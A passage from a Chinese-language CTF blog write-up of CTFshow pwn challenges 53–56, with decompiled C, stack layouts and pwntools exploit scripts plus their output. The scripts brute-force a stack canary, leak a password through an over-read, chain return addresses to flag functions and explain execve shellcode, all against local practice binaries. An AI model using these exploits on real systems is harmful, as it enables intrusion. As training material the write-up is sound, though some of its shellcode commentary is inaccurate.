class="string">&quot;/x00/x00/x00/x00&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /canary.txt &gt; /dev/null</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;critical&#x27;</span> <span class="comment">#context是pwntools中的全局配置对象，log_level 用于设置日志输出的详细程度。常见的级别从低到高为：debug（最详细）→ info → warning → error → critical（最简略）。</span></span><br><span class="line">canary = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): <span class="comment">#32位Canary共4字节，逐字节泄露</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFF</span>): <span class="comment">#尝试每个可能的字节值（0-255）</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>) <span class="comment">#程序输出&gt;(分隔符)后，-1输入【nbytes 被解析为负数时，在 32 位系统中会被转换为一个很大的无符号整数（因为 read 函数的第三个参数是无符号数），所以这句允许写入足够多的字节，触发栈溢出。】</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p8(c) <span class="comment">#p8(c)将c打包1字节(8位)的字节串，p8()会发送不可见字符，如果用b&#x27;&#x27;的话我们只能发送可见字符</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;$ &#x27;</span>,payload)</span><br><span class="line">io.recv(<span class="number">1</span>) <span class="comment"># 跳过的是程序输出中 &quot;$ &quot; 之后、关键判断信息之前的多余字符，最可能是 换行符 \n 或空字节，去掉也能打通（不懂）</span></span><br><span class="line">ans = io.recv()</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;Canary Value Incorrect!&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ans:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The index(&#123;&#125;),value(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(i,c)) </span><br><span class="line">canary += p8(c) <span class="comment">#保存该字节</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;tring... ...&#x27;</span>) </span><br><span class="line">io.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary=&#x27;</span>,canary) </span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag = elf.sym[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line"><span class="comment">#填充buf缓冲区并实现栈溢出</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p32(<span class="number">0</span>)*<span class="number">4</span> + p32(flag)<span class="comment">#p32(0)*4的作用是覆盖Canary之后到返回地址之间的所有内容</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;$ &#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">低地址</span><br><span class="line">栈地址              变量               大小       说明</span><br><span class="line">ebp-0x58~ebp-0x54  nbytes            4字节     用户输入的字节数</span><br><span class="line">ebp-0x50~ebp-0x30  var_50[8]         32字节    临时缓冲区(接收用户输入)</span><br><span class="line">ebp-0x30~ebp-0x10  buf[32]           32字节    目标缓冲区(存在溢出)</span><br><span class="line">ebp-0x10~ebp-0x0C  s1                4字节     canary副本(用于校验)</span><br><span class="line">ebp-0x0C~ebp-0x04  var_C             4字节    临时变量</span><br><span class="line">ebp-0x04~ebp+0x00  var_4             4字节    临时变量</span><br><span class="line">ebp+0x00~ebp+0x04  __saved_registers 4字节    保存的EBP寄存器</span><br><span class="line">ebp+0x04~ebp+0x08  __return_address  4字节    返回地址(覆盖目标)</span><br><span class="line">高地址</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">b<span class="string">&#x27;rror *** Stack Smashing Detected *** : Canary Value Incorrect!\n&#x27;</span></span><br><span class="line">tring... ...</span><br><span class="line">... </span><br><span class="line">...</span><br><span class="line">b<span class="string">&#x27;here is the flag?\n&#x27;</span></span><br><span class="line">The index(0),value(47)</span><br><span class="line">b<span class="string">&#x27;rror *** Stack Smashing Detected *** : Canary Value Incorrect!\n&#x27;</span></span><br><span class="line">tring... ...</span><br><span class="line">... </span><br><span class="line">...</span><br><span class="line">b<span class="string">&#x27;here is the flag?\n&#x27;</span></span><br><span class="line">The index(1),value(120)</span><br><span class="line">b<span class="string">&#x27;rror *** Stack Smashing Detected *** : Canary Value Incorrect!\n&#x27;</span></span><br><span class="line">tring... ...</span><br><span class="line">... </span><br><span class="line">...</span><br><span class="line">b<span class="string">&#x27;here is the flag?\n&#x27;</span></span><br><span class="line">The index(2),value(48)</span><br><span class="line">b<span class="string">&#x27;rror *** Stack Smashing Detected *** : Canary Value Incorrect!\n&#x27;</span></span><br><span class="line">tring... ...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">b<span class="string">&#x27;here is the flag?\n&#x27;</span></span><br><span class="line">The index(3),value(48)</span><br><span class="line">canary= b<span class="string">&#x27;/x00&#x27;</span></span><br><span class="line">Where is the flag?</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h2 id="pwn54"><a href="#pwn54" class="headerlink" title="pwn54"></a>pwn54</h2><p>Hint：再近一点靠近点快被融化</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位程序关闭栈保护与PIE</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">64</span>]; <span class="comment">// [esp+0h] [ebp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">256</span>]; <span class="comment">// [esp+40h] [ebp-160h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+140h] [ebp-60h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+180h] [ebp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [esp+184h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+194h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==========CTFshow-LOGIN==========&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Username:&quot;</span>);</span><br><span class="line">  fgets(v5, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v8 = <span class="built_in">strchr</span>(v5, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">    *v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcat</span>(v5, <span class="string">&quot;,\nInput your Password.&quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;/password.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/password.txt: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(v5);</span><br><span class="line">  fgets(s1, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome! Here&#x27;s what you want:&quot;</span>);</span><br><span class="line">    flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You has been banned!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>声明了一些局部变量，包括字符数组 s1 、v5 和 s ，以及文件指针 stream 、字符指针 v8 和整型指针 p_argc 。</p><p>接下来，使用 memset 函数将字符数组 s 、 v5 和 s1 初始化为全零。使用 fgets 函数从标准输入中读取用户输入的用户名，并存储到字符数组 v5 中。 v5的长度限制为 256 字节。接下来，使用strchr 函数在 s_ 中查找换行符 \n ，如果找到，则将其替换为字符串终止符 \0 。然后，使用strcat 函数将附加的字符串 “,\nInput your Password.” 连接到 s_ 后面。使用 fopen 函数打开名为 “&#x2F;password.txt” 的文件，以只读模式打开。如果打开失败，即文件不存在或无法打开，程序将输出一条错误信息 “&#x2F;password.txt: No such file or directory.” 并调用 exit(0) 终止程序。</p><p>接着，使用 fgets 函数从文件中读取一行内容（最多 64 个字符），存储到字符数组 s 中。这从”&#x2F;password.txt” 文件中读取的密码。</p><p>然后，使用 printf 输出欢迎信息 “Welcome “，并使用 puts 输出用户输入的用户名 v5 。</p><p>接下来，使用 fgets 函数从标准输入中读取用户输入的密码，并存储到字符数组 s1 中。</p><p>最后，将字符数组 v5 的第一个元素设置为零，清空用户输入的用户名。</p><p>接下来看关键部分：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome! Here&#x27;s what you want:&quot;</span>);</span><br><span class="line">    flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You has been banned!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这部分代码使用 strcmp 函数比较用户输入的密码 s1 和从文件中读取的密码 s 是否相等。如果相等，表示密码验证成功，输出欢迎信息 “Welcome! Here’s what you want:”，然后调用 flag 函数。</p><p>如果不相等，表示密码验证失败，输出 “You has been banned!” 的提示信息。</p><p>跟进flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [esp+Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">48</span>, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结起来，这段代码实现了一个简单的登录功能。它要求用户输入用户名和密码，并与预先存储在文件 “&#x2F;password.txt” 中的密码进行比较。如果密码验证成功，则输出欢迎信息并输出flag，但是并没有对用户名有啥要求。</p><p>那么关键就是我们如何找到password.txt内的内容</p><p>参数v5（存放name）和参数s（存放flag）在栈上的位置相差不远，而且给参数v5读入数据的时候可以覆盖道参数s</p><figure class="highlight plaintext"><figcaption><span>of main</span></figcaption><table><tr><td class="code"><pre><span class="line">-0000000000000060     _BYTE s;</span><br><span class="line">-0000000000000160     char v5;</span><br></pre></td></tr></table></figure><p>他们相差 0x160-0x60&#x3D;0x100 ，而且我们对v5输入的数据长度正好是0x100,可以将v5填充满，后面紧接着的就是s，main函数里的30行会将s_打印出来</p><p><strong>puts遇到’\x00’才停止</strong></p><p>将’n’替换成’x00’使得puts(v5)能正确输出输入的name，但如果输入了0x100个垃圾数据的话，会导致最后一个’n’并没有读入而导致程序在puts(v5)时会连带下面的password一起输出，这样我们就可以得到服务器上的password，所以会将password顺带着打印出来。</p><p>我们可以借此接收到服务器中password.txt的内容，再重新连接一次输入我们接收到的密码输入进去即可获得flag。这次用户名就随意了，小于256即可，然后再输入密码。。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地自己写文件</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span>/password.txt &gt; /dev/null</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac&quot;</span> <span class="comment">#cyclic(0x100)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;aa,&#x27;</span>) <span class="comment"># 定位到payload中的特征点</span></span><br><span class="line">password = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).strip()  <span class="comment"># 读取完整密码行并去除换行符</span></span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line">io.close()</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;bit&#x27;</span>) <span class="comment">#用户名</span></span><br><span class="line">io.sendline(password)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 103</span><br><span class="line">b<span class="string">&#x27;CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3&#x27;</span></span><br><span class="line">[*] Process <span class="string">&#x27;./pwn&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 103)</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 105</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./pwn&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 105)</span><br><span class="line">==========CTFshow-LOGIN==========</span><br><span class="line">Input your Username:</span><br><span class="line">Welcome bit,</span><br><span class="line">Input your Password.</span><br><span class="line">Welcome! Here<span class="string">&#x27;s what you want:</span></span><br><span class="line"><span class="string">flag&#123;just_test_my_process&#125;</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure><h2 id="pwn55"><a href="#pwn55" class="headerlink" title="pwn55"></a>pwn55</h2><p>Hint：你是我的谁，我的我是你的谁</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位关闭栈保护与PIE</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How to find flag?&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+Ch] [ebp-2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gets函数输入，没有限制读入长度，存在溢出漏洞</p><p>发现三个跟flag有关的函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">flag</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [esp+Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">48</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( flag1 &amp;&amp; flag2 &amp;&amp; a1 == <span class="number">-1111638595</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( flag1 &amp;&amp; flag2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Incorrect Argument.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( flag1 || flag2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Nice Try!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Flag is not here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到程序将flag读入到了参数s里面，满足条件flag1&amp;&amp;flag2 &amp;&amp;a1&#x3D;&#x3D;0xBDBDBDBD的条件，就能读出flag</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Elf32_Dyn **<span class="title function_">flag_func1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Dyn **_GLOBAL_OFFSET_TABLE; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _GLOBAL_OFFSET_TABLE = &amp;GLOBAL_OFFSET_TABLE_;</span><br><span class="line">  flag1 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> _GLOBAL_OFFSET_TABLE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag_func1函数直接给flag1赋值成了1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Elf32_Dyn **__cdecl <span class="title function_">flag_func2</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Dyn **_GLOBAL_OFFSET_TABLE; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  _GLOBAL_OFFSET_TABLE = &amp;GLOBAL_OFFSET_TABLE_;</span><br><span class="line">  <span class="keyword">if</span> ( flag1 &amp;&amp; a1 == <span class="number">-1397969748</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    flag2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( flag1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> (Elf32_Dyn **)<span class="built_in">puts</span>(<span class="string">&quot;Try Again.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> (Elf32_Dyn **)<span class="built_in">puts</span>(<span class="string">&quot;Try a little bit.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _GLOBAL_OFFSET_TABLE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag_func2函数当满足条件的时候会将flag2赋值为1</p><p>那么我们思路就很明确了，首先溢出后覆盖ret为flag_func1,将flag1赋值为1。之后跳转到flag_func2的地址，a1是传入的参数，将a1传入即可满足条件去设置flag2的值为1，之后去执行flag函数，if要满足的条件之前都设置好了，可以直接读出flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28199)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag_func1 = elf.sym[<span class="string">&#x27;flag_func1&#x27;</span>]</span><br><span class="line">flag_func2 = elf.sym[<span class="string">&#x27;flag_func2&#x27;</span>]</span><br><span class="line">flag = elf.sym[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">0x2c</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(flag_func1)</span><br><span class="line">payload += p32(flag_func2) + p32(flag) + p32(<span class="number">0xACACACAC</span>) + p32(<span class="number">0xBDBDBDBD</span>) <span class="comment">#-1397969748（0xACACACAC）,-1111638595（0xBDBDBDBD）</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;flag: &quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 1300</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn56"><a href="#pwn56" class="headerlink" title="pwn56"></a>pwn56</h2><p>Hint：先了解一下简单的32位shellcode吧</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      No RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX disabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护全关</p><p>IDA查看一下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> _bin___sh_[<span class="number">10</span>]; <span class="comment">// [esp-Ch] [ebp-Ch] BYREF</span></span><br><span class="line">  __int16 v2; <span class="comment">// [esp-2h] [ebp-2h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(_bin___sh_, <span class="string">&quot;/bin///sh&quot;</span>);</span><br><span class="line">  v0 = sys_execve(_bin___sh_, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显就是简单的调用了一个shell，那么我们进行逐步分析：</p><p>先将汇编代码拿出来分析：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    68h ; &#x27;h&#x27;</span><br><span class="line">push    732F2F2Fh</span><br><span class="line">push    6E69622Fh</span><br><span class="line">mov     ebx, esp        ; file</span><br><span class="line">xor     ecx, ecx        ; argv</span><br><span class="line">xor     edx, edx        ; envp</span><br><span class="line">push    0Bh</span><br><span class="line">pop     eax</span><br><span class="line">int     80h             ; LINUX - sys_execve</span><br></pre></td></tr></table></figure><p>这段代码是x86汇编语言的代码，用于在Linux系统上执行一个系统调用来执行</p><p>execve(“&#x2F;bin&#x2F;sh”, NULL, NULL) 。让我们逐行解析代码的功能：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x68 </span><br><span class="line">#这行代码将十六进制值 0x68 （104的十进制表示）压入栈中。这是为了将后续的字符串 &quot;/bin/sh&quot;的长度（11个字符）放入栈中，以便后续使用。</span><br><span class="line">push 0x732f2f2f</span><br><span class="line">#这行代码将十六进制值 0x732f2f2f 压入栈中。这是字符串 &quot;/bin/sh&quot; 的前半部分字符的逆序表示，即 &quot;sh//&quot;。这是因为x86架构是小端字节序的，字符串需要以逆序方式存储在内存中。</span><br><span class="line">push 0x6e69622f</span><br><span class="line">#这行代码将十六进制值 0x6e69622f 压入栈中。这是字符串 &quot;/bin/sh&quot; 的后半部分字符的逆序表</span><br><span class="line">示，即 &quot;/bin&quot;。</span><br><span class="line">mov ebx,esp</span><br><span class="line">#这行代码将栈顶的地址（即字符串&quot;/bin/sh&quot;的起始地址）复制给寄存器 ebx。ebx寄存器将用作execve 系统调用的第一个参数，即要执行的可执行文件的路径。</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">#这两行代码使用异或操作将 ecx 和 edx 寄存器的值设置为零。 ecx 和 edx 分别将用作 execve系统调用的第二个和第三个参数，即命令行参数和环境变量。在此情况下，我们将它们设置为 NULL，表示没有命令行参数和环境变量。</span><br><span class="line">push 0xB</span><br><span class="line">pop eax</span><br><span class="line">这两行代码将值11（0xb）压入栈中，然后从栈中弹出到寄存器 eax。eax寄存器将用作系统调用号，11表示execve系统调用的系统调用号。</span><br><span class="line">int 0x80</span><br><span class="line">这行代码触发中断 0x80 ，这是Linux系统中用于执行系统调用的中断指令。通过设置适当的寄存器值（ eax 、 ebx 、 ecx 、 edx ）， int 0x80 指令将执行 execve(&quot;/bin/sh&quot;, NULL, NULL) 系统调用，从而启动一个新的 shell 